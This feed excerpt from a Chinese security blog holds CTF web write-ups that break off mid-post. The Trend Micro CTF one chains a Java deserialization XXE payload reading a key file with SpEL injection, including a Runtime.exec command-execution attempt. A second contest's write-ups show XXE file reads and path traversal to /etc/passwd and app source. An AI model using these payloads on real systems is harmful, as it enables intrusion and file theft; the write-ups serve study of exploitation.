    <id>http://skysec.top/2019/09/27/2019-Trend-Micro-CTF-Java-Web/</id>
    <published>2019-09-27T06:43:07.000Z</published>
    <updated>2019-10-19T02:49:43.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前写的文章都是偏重于php，本篇文章就以2019 Trend Micro CTF的一道300分的Java Web开始我的Java之路吧~</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目给了1个war包，那么很明显是一道代码审计题目，我们使用JD-GUI打开分析一下代码，代码结构大致如下：<br><img src="/images/2019-09-27-14-47-08.png" alt="">zhao<br>我们在Office类中看到需要接收2个参数：<br><img src="/images/2019-09-27-14-49-53.png" alt=""><br>继续往下跟进，我们看到一个明显的spel表达式注入点：<br><img src="/images/2019-09-27-14-52-49.png" alt=""><br>而nametag正是我们传入的参数，同时未做任何过滤，便带入了表达式中进行解析，那么这明显是一个可控利用点。<br>但是如何进入该if条件句成为了一个问题，我们注意到：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String keyParam = request.getParameter(<span class="string">"key"</span>);</span><br><span class="line">String keyFileLocation = <span class="string">"/TMCTF2019/key"</span>;</span><br><span class="line"><span class="keyword">if</span> (key.contentEquals(keyParam))</span><br></pre></td></tr></table></figure></p><p>我们必须满足我们传入的key和文件<code>/TMCTF2019/key</code>中的值一致才可以进入该条件句，那么只要找到一个文件任意读取的点即可。</p><h2 id="XXE任意文件读取"><a href="#XXE任意文件读取" class="headerlink" title="XXE任意文件读取"></a>XXE任意文件读取</h2><p>继续审计代码，发现在Person类中，存在XXE文件读取点：<br><img src="/images/2019-09-27-15-00-01.png" alt=""><br>而结果会回显在Server类中：<br><img src="/images/2019-09-27-15-00-38.png" alt=""><br>我们写出对应的exp：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.trendmicro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">559038737L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream aInputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, ParserConfigurationException, SAXException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> paramInt = aInputStream.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[paramInt];</span><br><span class="line">        aInputStream.read(arrayOfByte);</span><br><span class="line">        ByteArrayInputStream localByteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(arrayOfByte);</span><br><span class="line">        DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">        localDocumentBuilderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">        DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();</span><br><span class="line">        Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);</span><br><span class="line">        NodeList nodeList = localDocument.getElementsByTagName(<span class="string">"tag"</span>);</span><br><span class="line">        Node node = nodeList.item(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = node.getTextContent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span> <span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException, ParserConfigurationException, SAXException</span>&#123;</span><br><span class="line">        String xml = <span class="string">"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;  \n"</span> +</span><br><span class="line">                <span class="string">"&lt;!DOCTYPE ANY [  \n"</span> +</span><br><span class="line">                <span class="string">"&lt;!ENTITY shit SYSTEM \"file:///TMCTF2019/key\"&gt;   \n"</span> +</span><br><span class="line">                <span class="string">"]&gt;  \n"</span> +</span><br><span class="line">                <span class="string">"&lt;root&gt;&lt;tag&gt;&amp;shit;&lt;/tag&gt;&lt;/root&gt; "</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] bs = xml.getBytes();</span><br><span class="line">        out.writeInt(bs.length);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream(bs.length);</span><br><span class="line">        baos.write(bs);</span><br><span class="line">        out.write(baos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.trendmicro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person(<span class="string">"a"</span>);</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./obj"</span>));</span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先运行生成exp文件，然后利用python将其作为data发送，尝试进行XXE攻击读取文件/TMCTF2019/key：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://flagmarshal.xyz/jail'</span></span><br><span class="line">f = open(<span class="string">'./obj'</span>,<span class="string">'rb'</span>)</span><br><span class="line">exp = f.read()</span><br><span class="line">r = requests.post(url = url,data=exp)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>可以成功读到回显：<br><img src="/images/2019-09-27-16-08-27.png" alt=""><br>我们关注到现在的<code>person.name</code>已经变成了我们xxe读取的文件内容，我们成功的获取了<code>/TMCTF2019/key</code>，其值为：<code>Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain</code></p><h2 id="Spel表达式注入攻击"><a href="#Spel表达式注入攻击" class="headerlink" title="Spel表达式注入攻击"></a>Spel表达式注入攻击</h2><p>那么我们回到之前的点，剩下的就是对其进行攻击：<br><img src="/images/2019-09-27-16-14-16.png" alt=""><br>我们关注到并没有实际的回显点，我们首先尝试命令执行：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://flagmarshal.xyz/Office?key=Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain&amp;nametag=%s"</span></span><br><span class="line">exp = <span class="string">'''T(java.lang.Runtime).getRuntime().exec("nslookup a.com")'''</span></span><br><span class="line">now_url = url %exp</span><br><span class="line">r = requests.get(now_url)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>得到回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please remember that I can only resolve the &apos;com.trendmicro.jail.Flag&apos; classI am sorry but you cannot see the Marshal</span><br></pre></td></tr></table></figure></p><p>我们发现只允许我们使用：<code>com.trendmicro.jail.Flag</code><br>我们进行代码审计：<br><img src="/images/2019-09-27-16-21-03.png" alt=""><br>我们发现，只要调用getflag()函数即可在报错信息中得到flag。<br>注意到表达式为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'nametag'</span> == <span class="string">'Marshal'</span></span><br></pre></td></tr></table></figure></p><p>我们的可控点在nametag，我们尝试构造：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nametag = <span class="string">'+T(com.trendmicro.jail.Flag).getFlag()+'</span></span><br></pre></td></tr></table></figure></p><p>这样即可得到：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>+T(com.trendmicro.jail.Flag).getFlag()+<span class="string">''</span> == <span class="string">'Marshal'</span></span><br></pre></td></tr></table></figure></p><p>我们尝试利用：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://flagmarshal.xyz/Office?key=Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain&amp;nametag=%s"</span></span><br><span class="line">exp =<span class="string">"""'+T(com.trendmicro.jail.Flag).getFlag()+'"""</span></span><br><span class="line">now_url = url %exp</span><br><span class="line">r = requests.get(now_url)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>发现出现了报错，其中并无flag：<br><img src="/images/2019-09-27-16-29-07.png" alt=""><br>纠结了许久，发现是<code>+</code>需要编码为<code>%2B</code>的问题，更正后即可getflag:<br><img src="/images/2019-09-27-16-30-01.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目串联了2个漏洞：Spel表达式注入+XXE文件任意读取，放在Java中还是可以学到一些知识的~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前写的文章都是偏重于php，本篇文章就以2019 Trend Micro CTF的一道300分的Java Web开始我的Java之路吧~&lt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019网络与信息安全领域专项赛Web Writeup</title>
    <link href="http://skysec.top/2019/08/15/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb%20Writeup/"/>
    <id>http://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web Writeup/</id>
    <published>2019-08-15T10:50:10.000Z</published>
    <updated>2019-09-27T06:06:01.476Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天要坐5个小时的高铁，在车上顺便打了个比赛，以下是web题解。</p><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><p><img src="/images/2019-08-15-16-46-50.png" alt=""><br>拿到题发现是个老虎机= =，本能的查看JS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4c7add9a08cb4acda1bec9c7693bf7d121100f86cdf74096.changame.ichunqiu.com/js/cqg.js</span><br></pre></td></tr></table></figure></p><p>发现：<br><img src="/images/2019-08-15-16-47-34.png" alt=""><br>随机直接给score.php发包：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://4c7add9a08cb4acda1bec9c7693bf7d121100f86cdf74096.changame.ichunqiu.com/score.php'</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'score'</span>:<span class="string">'15'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-15-16-49-27.png" alt=""></p><h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who_are_you?"></a>who_are_you?</h2><p>打开题目发现是个姓名输入，测试了一下发现不是啥注入登录= =：<br><img src="/images/2019-08-15-16-50-19.png" alt=""><br>随即查看了一下源代码：<br><img src="/images/2019-08-15-16-51-05.png" alt=""><br>发现存在xml语句，那么抓包尝试进行XXE文件读取：<br><img src="/images/2019-08-15-16-52-17.png" alt=""><br>发现是有回显的XXE，那么简单构造，探测过滤：<br><img src="/images/2019-08-15-16-56-10.png" alt=""><br>直接尝试任意文件读取：<br><img src="/images/2019-08-15-16-56-31.png" alt=""><br>探测web目录，上字典进行扫描：<br><img src="/images/2019-08-15-16-58-23.png" alt=""><br>直接发现了web目录，随即进行读取：<br><img src="/images/2019-08-15-16-59-25.png" alt=""><br>解码后发现得到flag：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//$flag='flag&#123;718a9c72-3d56-4ea9-9a14-d9db51228f61&#125;';</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;718a9c72-3d56-4ea9-9a14-d9db51228f61&#125;</span><br></pre></td></tr></table></figure></p><h2 id="show-me-your-image"><a href="#show-me-your-image" class="headerlink" title="show_me_your_image"></a>show_me_your_image</h2><p>拿到题目后，发现是一个上传界面：<br><img src="/images/2019-08-15-17-02-49.png" alt=""><br>上传图片后得到路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8ee9e71577b74be2a9678e5411e4b1b76b9c259063c54091.changame.ichunqiu.com/img.php?name=TYrg73eHzZhRjmPg</span><br></pre></td></tr></table></figure></p><p>同时session为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJmaWxlIjp7IiBiIjoiVkZseVp6Y3paVWg2V21oU2FtMVFadz09In19.XVWOtA.QVC_HI-oJpjQCJ1v1UaxzUEd2BA</span><br></pre></td></tr></table></figure></p><p>解码得到：<br><img src="/images/2019-08-15-17-08-16.png" alt=""><br>题目有2个地方感觉比较奇怪，第一个地方是文件名比较奇怪，并不是普通的base64，第二个是session比较奇怪，像JWT又不是，观察题目的路由，是发给upload.php的，这是个PHP，却又有不符合php样子的东西，这一点为接下来的内容埋下了伏笔。<br>首先针对文件名进行研究，不难发现，文件名受上传文件的filename影响，同时并不是正常的base64。<br>同时如果想更改文件名进行任意文件读取，会返回500：<br><img src="/images/2019-08-15-17-07-50.png" alt=""><br>经过研究发现，码表是被更换过的：</p><p>我们搞出码表的映射关系：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ax=<span class="string">'YWFhYmJiY2NjZGRkZWVlZmZmZ2dnaGhoaWlpampqa2trbGxsbW1tbm5ub29vcHBwcXFxcnJyc3NzdHR0dXV1dnZ2d3d3eHh4eXl5enp6QUFBQkJCQ0NDRERERUVFRkZGR0dHSEhISUlJSkpKS0tLTExMTU1NTk5OT09PUFBQUVFRUlJSU1NTVFRUVVVVVlZWV1dXWFhYWVlZWlpaMDAwMTExMjIyMzMzNDQ0NTU1NjY2Nzc3ODg4OTk58+/7f'</span></span><br><span class="line">bx=<span class="string">'0YNf0XCx0ODkMmW9MYPVMXMXMOSgTmfvTYVsTXsRTOFcAmHuAYrFAXh+AOn8jodpjLNHjgC4jUDBSoW1SLPrSgMOSUSU6ofb6LVh6gsKqJNdq9C3q1DyWiWiWJPNW9MmW1SoZif7ZJVCZ9szZ1Fa5iHl5JrD59hw51n2JNdqJPNWJVCZJrD5PNWJPPPPPVMYPrSLYNf0YPVMYVsTly/pl5iHlk74lBlBDyq1D5JrDk0ODBjUwyebw59htQEGI'</span></span><br><span class="line"></span><br><span class="line">c = string.maketrans(ax,bx)</span><br><span class="line">print(string.translate(<span class="string">"index.php"</span>, c))</span><br></pre></td></tr></table></figure></p><p>此时编码就正常了许多，我们可以进行任意文件读取了：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://8ee9e71577b74be2a9678e5411e4b1b76b9c259063c54091.changame.ichunqiu.com/img.php?name='</span></span><br><span class="line">ax=<span class="string">'YWFhYmJiY2NjZGRkZWVlZmZmZ2dnaGhoaWlpampqa2trbGxsbW1tbm5ub29vcHBwcXFxcnJyc3NzdHR0dXV1dnZ2d3d3eHh4eXl5enp6QUFBQkJCQ0NDRERERUVFRkZGR0dHSEhISUlJSkpKS0tLTExMTU1NTk5OT09PUFBQUVFRUlJSU1NTVFRUVVVVVlZWV1dXWFhYWVlZWlpaMDAwMTExMjIyMzMzNDQ0NTU1NjY2Nzc3ODg4OTk58+/7f'</span></span><br><span class="line">bx=<span class="string">'0YNf0XCx0ODkMmW9MYPVMXMXMOSgTmfvTYVsTXsRTOFcAmHuAYrFAXh+AOn8jodpjLNHjgC4jUDBSoW1SLPrSgMOSUSU6ofb6LVh6gsKqJNdq9C3q1DyWiWiWJPNW9MmW1SoZif7ZJVCZ9szZ1Fa5iHl5JrD59hw51n2JNdqJPNWJVCZJrD5PNWJPPPPPVMYPrSLYNf0YPVMYVsTly/pl5iHlk74lBlBDyq1D5JrDk0ODBjUwyebw59htQEGI'</span></span><br><span class="line"></span><br><span class="line">c = string.maketrans(ax,bx)</span><br><span class="line">name = string.translate(base64.b64encode(<span class="string">"../../../etc/passwd"</span>), c)</span><br><span class="line">url = url+name</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">print</span> url</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-15-17-13-18.png" alt=""><br>此时对/proc目录进行读取探测，发现stat正常：<br><img src="/images/2019-08-15-17-14-13.png" alt=""><br>此时奇怪的事情发生了，看到了一个python3，明明是php的程序，为什么会有python3？<br>于是我对cmdline进行了读取：<br><img src="/images/2019-08-15-17-20-29.png" alt=""><br>发现还真有一个app.py被启动了，那么我赶紧对其源码进行读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../proc/self/cwd/app.py</span><br></pre></td></tr></table></figure></p><p>（这里要注意url编码）<br>即可拿到app.py:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> r_encode, r_decode, read_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp/uploads/'</span></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@app.route('/index.php')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    file = session.get(<span class="string">'file'</span>)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        file = bytes.decode(file)</span><br><span class="line">        file = parse.quote(file)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, file=file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload.php', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">                os.makedirs(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"不允许的格式"</span></span><br><span class="line">    session[<span class="string">'file'</span>] = r_encode(b64encode(str.encode(file.filename)))</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/img.php', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">()</span>:</span></span><br><span class="line">    file = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">    file = r_decode(str.encode(file))</span><br><span class="line">    file = b64decode(file)</span><br><span class="line">    file = UPLOAD_FOLDER + bytes.decode(file)</span><br><span class="line">    image = read_file(file)</span><br><span class="line">    <span class="keyword">return</span> Response(image, mimetype=<span class="string">"ima/jpeg"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host = <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port = <span class="number">80</span>,</span><br><span class="line">     )</span><br></pre></td></tr></table></figure></p><p>不禁感叹出题人的阴线，把一个python题目搞成php的样子，叫这种名字的路由= =。<br>接着寻找flag文件，看到出题人的提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 